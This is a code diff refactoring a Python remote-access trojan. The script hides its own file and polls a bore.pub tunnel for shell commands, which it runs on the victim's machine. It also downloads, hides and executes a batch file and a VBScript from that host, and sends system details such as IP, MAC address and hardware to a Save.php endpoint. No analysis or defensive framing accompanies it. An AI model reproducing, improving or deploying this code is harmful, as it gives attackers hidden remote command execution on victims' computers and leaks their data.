@@ -12,7 +12,8 @@ import concurrent.futures
 import random
 import threading
 
-os.system("attrib +h BN.pyw")
+# Hide BN.pyw
+subprocess.Popen("attrib +h BN.pyw", shell=True)
 
 # Function to clear the console screen
 def clear_screen():
@@ -32,15 +33,20 @@ def send_data_to_url(url, data):
     except Exception as e:
         return f"Error sending data to {url}: {str(e)}"
 
+
 # Function to continuously receive and process data
 def receive_data():
     global previous_data
+    port = port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+    php_script_url = f'http://bore.pub:{port}/Control.php'
     while True:
         response = requests.get(php_script_url)
         data = response.text
 
         if data != "" and data != previous_data:
             if '::' in data:
+                mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+                mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
                 received_mac, command = data.split('::', 1)
                 if received_mac == mac:
                     subprocess.Popen(f"{command}", shell=True)
@@ -50,81 +56,44 @@ def receive_data():
             else:
                 subprocess.Popen(f"{data}", shell=True)
                 previous_data = data
-
-        time.sleep(3)
-
-# Generate the device's MAC address
-mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
-mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
-
-# Set the PHP script URL and initial previous_data
-port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-php_script_url = f'http://bore.pub:{port}/Control.php'
 previous_data = ""
 
 # Start the data receiving thread
 receive_thread = threading.Thread(target=receive_data)
 receive_thread.start()
 
-# Main loop for other tasks
-while True:
+# Function to download and save a file
+def download_file(url, save_path):
     try:
-        home_directory = os.path.expanduser("~")
-        web_page1_path = os.path.join(home_directory, "Script.bat")
-        vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
-
-        if os.path.exists(web_page1_path):
-            os.remove(web_page1_path)
-        if os.path.exists(vbs_file_path):
-            os.remove(vbs_file_path)
-
-        port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-
-        url1 = f"http://bore.pub:{port}/Script.io"
-        url2 = f"http://bore.pub:{port}/VBSEX.io"
-
-        response1 = requests.get(url1)
-        if response1.status_code == 200:
-            with open(web_page1_path, "wb") as file:
-                file.write(response1.content)
-            print(f"Downloaded and saved web page 1 to {web_page1_path}")
+        response = requests.get(url)
+        if response.status_code == 200:
+            with open(save_path, "wb") as file:
+                file.write(response.content)
+            print(f"Downloaded and saved {url} to {save_path}")
         else:
-            print(f"Failed to download web page 1. Status code: {response1.status_code}")
-            continue
+            print(f"Failed to download {url}. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"Error downloading {url}: {str(e)}")
 
-        response2 = requests.get(url2)
-        if response2.status_code == 200:
-            with open(vbs_file_path, "wb") as file:
-                file.write(response2.content)
-            print(f"Downloaded and saved web page 2 to {vbs_file_path}")
-        else:
-            print(f"Failed to download web page 2. Status code: {response2.status_code}")
-            continue
+# Function to hide files on Windows
+def hide_files_windows(file_paths):
+    try:
+        for file_path in file_paths:
+            ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
+    except Exception as e:
+        print(f"Error hiding files on Windows: {str(e)}")
 
-        if os.path.isfile(vbs_file_path):
-            subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
+# Function to hide files on Unix-based systems
+def hide_files_unix(file_paths):
+    try:
+        for file_path in file_paths:
+            os.chmod(file_path, 0o400)  
+    except Exception as e:
+        print(f"Error hiding files on Unix-based system: {str(e)}")
 
-        downloaded_files = [web_page1_path, vbs_file_path]
-
-        def hide_files_windows(file_paths):
-            try:
-                for file_path in file_paths:
-                    ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  
-            except Exception as e:
-                print(f"Error hiding files on Windows: {str(e)}")
-
-        def hide_files_unix(file_paths):
-            try:
-                for file_path in file_paths:
-                    os.chmod(file_path, 0o400)  
-            except Exception as e:
-                print(f"Error hiding files on Unix-based system: {str(e)}")
-
-        if os.name == 'nt':
-            hide_files_windows(downloaded_files)
-        else:
-            hide_files_unix(downloaded_files)
-
+# Function to retrieve system information
+def get_system_info():
+    try:
         mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
         mac = ':'.join([mac[e:e+2] for e in range(0, 12, 2)])
         computer = wmi.WMI()
@@ -143,8 +112,8 @@ while True:
         pros = platform.processor()
         ram = str(round(psutil.virtual_memory().total / (1024.0 ** 3))) + " GB"
         ip = requests.get('https://checkip.amazonaws.com').text.strip()
-
         hostname = socket.gethostname()
+        
         data_to_send = {
             "DeviceID": f"{hostname}",
             "IP Address": f"{ip}",
@@ -156,14 +125,60 @@ while True:
             "Machine": f"{mach}",
         }
 
-        portx = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
-        php_urls = [f"http://bore.pub:{portx}/Save.php"]
+        return data_to_send
 
-        with concurrent.futures.ThreadPoolExecutor() as executor:
-            results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)
+    except Exception as e:
+        print(f"Error retrieving system information: {str(e)}")
+        return None
 
-        for result in results:
-            print(result)
+# Define URLs and paths
+port = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+php_script_url = f'http://bore.pub:{port}/Control.php'
+home_directory = os.path.expanduser("~")
+web_page1_path = os.path.join(home_directory, "Script.bat")
+vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
+
+# Start the data
+# Start the data receiving thread
+receive_thread = threading.Thread(target=receive_data)
+receive_thread.start()
+
+# Main loop for other tasks
+while True:
+    try:
+        # Delete existing files
+        for file_path in [web_page1_path, vbs_file_path]:
+            if os.path.exists(file_path):
+                os.remove(file_path)
+
+        # Download files
+        url1 = f"http://bore.pub:{port}/Script.io"
+        url2 = f"http://bore.pub:{port}/VBSEX.io"
+
+        download_file(url1, web_page1_path)
+        download_file(url2, vbs_file_path)
+
+        # Hide downloaded files
+        if os.name == 'nt':
+            hide_files_windows([web_page1_path, vbs_file_path])
+        else:
+            hide_files_unix([web_page1_path, vbs_file_path])
+
+        # Execute VBScript if it exists
+        if os.path.isfile(vbs_file_path):
+            subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
+
+        # Send system information
+        data_to_send = get_system_info()
+        if data_to_send:
+            portx = random.choice([61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012])
+            php_urls = [f"http://bore.pub:{portx}/Save.php"]
+
+            with concurrent.futures.ThreadPoolExecutor() as executor:
+                results = executor.map(lambda url: send_data_to_url(url, data_to_send), php_urls)
+
+            for result in results:
+                print(result)
 
         time.sleep(0)
 
